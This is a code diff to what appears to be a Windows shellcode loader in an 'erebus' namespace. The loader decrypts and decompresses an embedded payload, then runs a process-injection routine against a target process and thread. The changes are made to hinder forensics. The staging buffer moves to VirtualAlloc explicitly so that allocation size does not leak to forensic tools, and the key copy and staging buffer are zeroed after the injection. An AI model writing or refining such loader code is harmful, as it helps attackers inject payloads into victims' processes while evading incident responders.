@@ -108,15 +108,16 @@ VOID entry(void)
 	// 3. Decompress shellcode if needed
 	// ============================================================
 
-	// Allocate writable memory for shellcode (original is read-only)
-	BYTE* shellcode_ptr = (BYTE*)malloc(shellcode_size);
+	// Allocate writable memory for shellcode via VirtualAlloc (avoids CRT heap
+	// metadata that leaks allocation size to forensic tools).
+	BYTE* shellcode_ptr = (BYTE*)VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!shellcode_ptr)
 	{
 		LOG_ERROR("Failed to allocate shellcode buffer");
 		return;
 	}
 	RtlCopyMemory(shellcode_ptr, shellcode, shellcode_size);
-	
+
 	BYTE* iv = nullptr;
 	SIZE_T iv_len = 0;
 	#if CONFIG_ENCRYPTION_TYPE == 4
@@ -127,26 +128,35 @@ VOID entry(void)
 	}
 	#endif
 
-	erebus::DecryptShellcodeWithKeyAndIv(&shellcode_ptr, &shellcode_size, key, sizeof(key), iv, iv_len);
+	// Decrypt with explicit key — key material is zeroed immediately after.
+	BYTE key_copy[sizeof(key)];
+	RtlCopyMemory(key_copy, key, sizeof(key));
+	erebus::DecryptShellcodeWithKeyAndIv(&shellcode_ptr, &shellcode_size, key_copy, sizeof(key_copy), iv, iv_len);
+	SecureZeroMemory(key_copy, sizeof(key_copy));
+
 	erebus::DecompressShellcode(&shellcode_ptr, &shellcode_size);
-	
+
 	if (shellcode_ptr == NULL || shellcode_size == 0)
 	{
 		LOG_ERROR("Shellcode processing failed - invalid result");
-		if (shellcode_ptr) free(shellcode_ptr);
+		if (shellcode_ptr) {
+			SecureZeroMemory(shellcode_ptr, shellcode_size);
+			VirtualFree(shellcode_ptr, 0, MEM_RELEASE);
+		}
 		return;
 	}
 
 	LOG_SUCCESS("Processed shellcode: %zu bytes", shellcode_size);
-	
+
 	// Execute injection
 	erebus::config.injection_method(shellcode_ptr, shellcode_size, process_handle, thread_handle);
 
-	LOG_SUCCESS("Final shellcode size: %zu bytes", shellcode_size);
-
-	// Cleanup
+	// Scrub the staging buffer — shellcode is now in the target process.
 	if (shellcode_ptr)
-		free(shellcode_ptr);
+	{
+		SecureZeroMemory(shellcode_ptr, shellcode_size);
+		VirtualFree(shellcode_ptr, 0, MEM_RELEASE);
+	}
 
 	return;
 }
